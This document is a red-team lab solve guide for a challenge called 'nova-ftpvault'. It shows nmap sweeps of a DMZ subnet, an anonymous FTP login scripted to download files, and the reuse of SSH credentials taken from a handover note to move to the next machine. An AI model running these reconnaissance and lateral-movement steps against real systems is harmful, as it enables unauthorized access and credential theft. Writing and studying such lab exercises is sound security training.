# 🔴 Red Team — M2: nova-ftpvault Solve Guide

**Challenge:** Anonymous FTP Access — Credential Exposure  
**Technique:** T1078.001 — Valid Accounts: Default Accounts  
**Entry Point:** From M1's shell, discover M2 on DMZ (11.0.0.0/8), port 21

---

## Step 1 — Discover M2 from M1

From your RCE shell on M1:

```bash
# Identify DMZ interface on M1
ip addr show
# Note the 11.x.x.x interface

# Scan DMZ for FTP
nmap -p 21 --open -sV 11.0.0.0/8 --min-rate 2000 -oN /tmp/dmz_scan.txt
cat /tmp/dmz_scan.txt
```

---

## Step 2 — Anonymous FTP Login

```bash
ftp <M2-DMZ-IP>
# Username: anonymous
# Password: (anything / blank)
```

Or via command-line one-liner:

```bash
ftp -inv <M2-DMZ-IP> << 'EOF'
user anonymous anonymous
ls -la
get flag2.txt /tmp/flag2.txt
get staff_handover.txt /tmp/staff_handover.txt
bye
EOF
```

---

## Step 3 — Read the Files

```bash
cat /tmp/flag2.txt          # Challenge flag
cat /tmp/staff_handover.txt # SSH credentials for M3
```

The handover note reveals:
```
User: devops
Pass: N0vaTech@24
Host: nova-gateway (SSH)
```

---

## Step 4 — Move to M3

```bash
# From M1 (DMZ interface), reach M3 via DMZ or Priv subnet
# M3 is dual-homed on DMZ — scan for SSH
nmap -p 22 --open 11.0.0.0/8 --min-rate 2000

ssh devops@<M3-DMZ-IP>
# Password: N0vaTech@24
```

---

## Flag Location
`/srv/ftp/flag2.txt`
